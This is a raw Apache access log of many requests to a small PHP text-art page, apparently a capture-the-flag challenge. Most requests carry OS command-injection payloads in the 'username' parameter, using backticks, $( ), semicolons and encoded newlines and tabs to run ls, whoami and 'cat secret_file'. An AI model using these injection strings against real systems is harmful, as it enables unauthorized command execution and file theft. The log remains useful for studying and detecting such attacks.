58.187.43.105 - - [28/Aug/2022:07:07:01 +0000] "GET /index.php?username=%60ls+-l%60&type=random HTTP/1.1" 200 1208 "http://128.199.190.141:5551/index.php?username=%60%27ls+-l%27%60&type=eyes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:07:02 +0000] "GET /index.php?username=%25&type=figlet HTTP/1.1" 200 1175 "http://128.199.190.141:5551/index.php?username=%24%28%29&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
14.161.31.188 - - [28/Aug/2022:07:07:09 +0000] "GET /index.php?username=%60ls+-l%60&type=eyes HTTP/1.1" 200 1203 "http://128.199.190.141:5551/index.php?username=%60ls+-l%60&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:07:13 +0000] "GET /index.php?username=a&type=eyes HTTP/1.1" 200 1163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:07:16 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250A&type=figlet HTTP/1.1" 200 1059 "http://128.199.190.141:5551/index.php?username=%3D%60cd%2509..%253B%2509cd%2509..%253B%2509cd%2509..%253B&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:07:25 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:07:32 +0000] "GET /index.php?username=a&type=random HTTP/1.1" 200 1181 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
58.187.43.105 - - [28/Aug/2022:07:07:37 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als&type=random HTTP/1.1" 200 1192 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:07:42 +0000] "GET /index.php?username=%3B&type=random HTTP/1.1" 200 1724 "http://128.199.190.141:5551/index.php?username=a&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
14.161.31.188 - - [28/Aug/2022:07:07:42 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:07:48 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als&type=figlet HTTP/1.1" 200 1061 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:07:58 +0000] "GET /index.php?username=asd+%3B+ls+-l&type=random HTTP/1.1" 200 1186 "http://128.199.190.141:5551/index.php?username=%60ls+-l%60&type=eyes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:08:11 +0000] "GET /index.php?username=%3B+ls&type=random HTTP/1.1" 200 1166 "http://128.199.190.141:5551/index.php?username=%3B&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
58.187.43.105 - - [28/Aug/2022:07:08:12 +0000] "GET /index.php?username=asd+;+ls+-l&type=random HTTP/1.1" 200 1223 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:08:19 +0000] "GET /index.php?username=%3Bls&type=random HTTP/1.1" 200 1184 "http://128.199.190.141:5551/index.php?username=%3B+ls&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
14.161.31.188 - - [28/Aug/2022:07:08:22 +0000] "GET / HTTP/1.1" 200 1198 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:08:23 +0000] "GET /demo.png HTTP/1.1" 200 103051 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:08:23 +0000] "GET /style.css HTTP/1.1" 200 955 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:08:23 +0000] "GET /favicon.ico HTTP/1.1" 404 495 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:08:23 +0000] "GET /index.php?username=%3Bls&type=toilet HTTP/1.1" 200 1195 "http://128.199.190.141:5551/index.php?username=%3Bls&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
14.161.31.188 - - [28/Aug/2022:07:08:26 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%2509&type=figlet HTTP/1.1" 200 1061 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:08:43 +0000] "GET / HTTP/1.1" 200 1259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:08:44 +0000] "GET /style.css HTTP/1.1" 200 956 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:08:44 +0000] "GET /demo.png HTTP/1.1" 200 103050 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:08:45 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%250A&type=figlet HTTP/1.1" 200 1061 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%2509&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:08:49 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet HTTP/1.1" 200 1873 "http://128.199.190.141:5551/index.php?username=cd%2509..%250Acd%2509..%250Acd%2509..%250Apwd&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:08:49 +0000] "GET /index.php?username=asd+%3B+ls-+l&type=eyes HTTP/1.1" 200 1207 "http://128.199.190.141:5551/index.php?username=asd+;+ls+-l&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:08:51 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet HTTP/1.1" 200 1873 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:08:54 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=eyes HTTP/1.1" 200 1246 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:08:55 +0000] "GET /log.txt HTTP/1.1" 404 496 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:09:04 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=eyes HTTP/1.1" 200 1213 "http://128.199.190.141:5551/index.php?username=%0A%09ls" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:09:04 +0000] "GET /index.php?username=cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%2509&type=figlet HTTP/1.1" 200 1315 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:09:07 +0000] "GET /index.php?username=%27%3Bcat+%2Fsecret_file+%23&type=random HTTP/1.1" 200 1310 "http://128.199.190.141:5551/index.php?username=%3Bls&type=toilet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
14.161.31.188 - - [28/Aug/2022:07:09:08 +0000] "GET /index.php?username=%2560&type=figlet HTTP/1.1" 200 1045 "http://128.199.190.141:5551/index.php?username=%25&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:07:09:15 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=eyes HTTP/1.1" 200 1209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:09:16 +0000] "GET /index.php?username=%60&type=figlet HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
14.161.31.188 - - [28/Aug/2022:07:09:17 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%2509&type=figlet HTTP/1.1" 200 1061 "http://128.199.190.141:5551/index.php?username=cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%2509&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:09:17 +0000] "GET / HTTP/1.1" 200 1202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
14.161.31.188 - - [28/Aug/2022:07:09:21 +0000] "GET /index.php?username=%27%3Bcat+%2Fsecret_file+%23&type=random HTTP/1.1" 200 1196 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
14.161.31.188 - - [28/Aug/2022:07:09:23 +0000] "GET /index.php?username=asd+%09+ls&type=eyes HTTP/1.1" 200 1210 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:09:28 +0000] "GET /index.php?username=&type=dragon HTTP/1.1" 200 1355 "http://128.199.190.141:5551/index.php?username=%27%3Bcat+%2Fsecret_file+%23&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
58.187.43.105 - - [28/Aug/2022:07:09:30 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=figlet HTTP/1.1" 200 1353 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:07:09:31 +0000] "GET /index.php?username=%3B&type=random HTTP/1.1" 200 1164 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:09:34 +0000] "GET /index.php?username=asd+%0a+ls&type=eyes HTTP/1.1" 200 1213 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:09:35 +0000] "GET /index.php?username=%27%3Bcat+%2Fsecret_file+%23&type=figlet HTTP/1.1" 200 1058 "http://128.199.190.141:5551/index.php?username=&type=dragon" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
14.161.31.188 - - [28/Aug/2022:07:09:37 +0000] "GET /index.php?username=%3B&type=gnu HTTP/1.1" 200 1276 "http://128.199.190.141:5551/index.php?username=%3B&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:09:39 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%2509&type=figlet HTTP/1.1" 200 1133 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%2509&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:09:40 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:09:46 +0000] "-" 408 0 "-" "-"
127.0.0.1 - - [28/Aug/2022:07:09:46 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) PHP/7.4.30 (internal dummy connection)"
58.187.43.105 - - [28/Aug/2022:07:09:46 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Als%60&type=eyes HTTP/1.1" 200 1197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:09:47 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:07:09:48 +0000] "GET /index.php?username=asd+%0a+pwd&type=eyes HTTP/1.1" 200 1214 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:09:48 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php?username=%26%26%3Bcat+%2F*+%23&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
127.0.0.1 - - [28/Aug/2022:07:09:56 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) PHP/7.4.30 (internal dummy connection)"
58.187.43.105 - - [28/Aug/2022:07:09:57 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%2509&type=figlet HTTP/1.1" 200 1133 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%2509&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:09:58 +0000] "-" 408 0 "-" "-"
127.0.0.1 - - [28/Aug/2022:07:10:05 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) PHP/7.4.30 (internal dummy connection)"
14.161.31.188 - - [28/Aug/2022:07:10:08 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Als%60&type=figlet HTTP/1.1" 200 1224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:07:10:16 +0000] "GET /index.php?username=who%24%28%29ami&type=toilet HTTP/1.1" 200 1218 "http://128.199.190.141:5551/index.php?username=%24%28ls%29&type=dragon" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:10:17 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=figlet HTTP/1.1" 200 1316 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:10:22 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file&type=figlet HTTP/1.1" 200 1077 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%2509&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:10:26 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=eyes HTTP/1.1" 200 1246 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:10:27 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:10:29 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:10:32 +0000] "GET /index.php?username=%27%3Bls+%2F+%23&type=figlet HTTP/1.1" 200 1048 "http://128.199.190.141:5551/index.php?username=%27%3Bcat+%2Fsecret_file+%23&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
58.187.43.105 - - [28/Aug/2022:07:10:37 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60 HTTP/1.1" 200 1245 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:07:10:44 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=random HTTP/1.1" 200 1170 "http://128.199.190.141:5551/index.php?username=who%24%28%29ami&type=toilet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:10:45 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:10:49 +0000] "GET /index.php?username=%27%3Bls+%2F+%23%27%3Bcat+%2Fsecret_file+%23&type=figlet HTTP/1.1" 200 1063 "http://128.199.190.141:5551/index.php?username=%27%3Bls+%2F+%23&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
171.253.1.35 - - [28/Aug/2022:07:10:56 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=random HTTP/1.1" 200 1196 "http://128.199.190.141:5551/index.php?username=who%24%28%29ami&type=toilet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:11:00 +0000] "GET /index.php?username=hi&type=gnu HTTP/1.1" 200 1277 "http://128.199.190.141:5551/index.php?username=%3B&type=gnu" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:11:00 +0000] "GET /index.php?username=$2550&type=eyes HTTP/1.1" 200 1168 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:07:11:01 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet HTTP/1.1" 200 1836 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:11:01 +0000] "GET /index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=figlet HTTP/1.1" 200 1353 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:11:03 +0000] "GET / HTTP/1.1" 200 1175 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:11:03 +0000] "GET /style.css HTTP/1.1" 200 955 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:11:03 +0000] "GET /demo.png HTTP/1.1" 200 103050 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:11:03 +0000] "GET /favicon.ico HTTP/1.1" 404 495 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:11:05 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%250Asecret_file&type=figlet HTTP/1.1" 200 1077 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:11:06 +0000] "GET /index.php?username=a&type=figlet HTTP/1.1" 200 1173 "http://128.199.190.141:5551/index.php?username=%27%3Bls+%2F+%23%27%3Bcat+%2Fsecret_file+%23&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
14.161.31.188 - - [28/Aug/2022:07:11:11 +0000] "GET /?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=eyes HTTP/1.1" 200 1250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:11:23 +0000] "-" 408 0 "-" "-"
127.0.0.1 - - [28/Aug/2022:07:11:24 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.54 (Debian) PHP/7.4.30 (internal dummy connection)"
58.187.43.105 - - [28/Aug/2022:07:11:26 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php?username=%60cd%09..%0Acd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%60&type=eyes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:11:26 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%250Asecret_file%2509&type=figlet HTTP/1.1" 200 1078 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%250Asecret_file&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:11:30 +0000] "GET /index.php?username=cd+..+cd+..+cd+..&type=random HTTP/1.1" 200 1181 "http://128.199.190.141:5551/index.php?username=hi&type=gnu" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:11:30 +0000] "GET / HTTP/1.1" 200 1194 "-" "ZaloPC-win32-24v355"
14.161.31.188 - - [28/Aug/2022:07:11:31 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Als%2509&type=figlet HTTP/1.1" 200 1061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
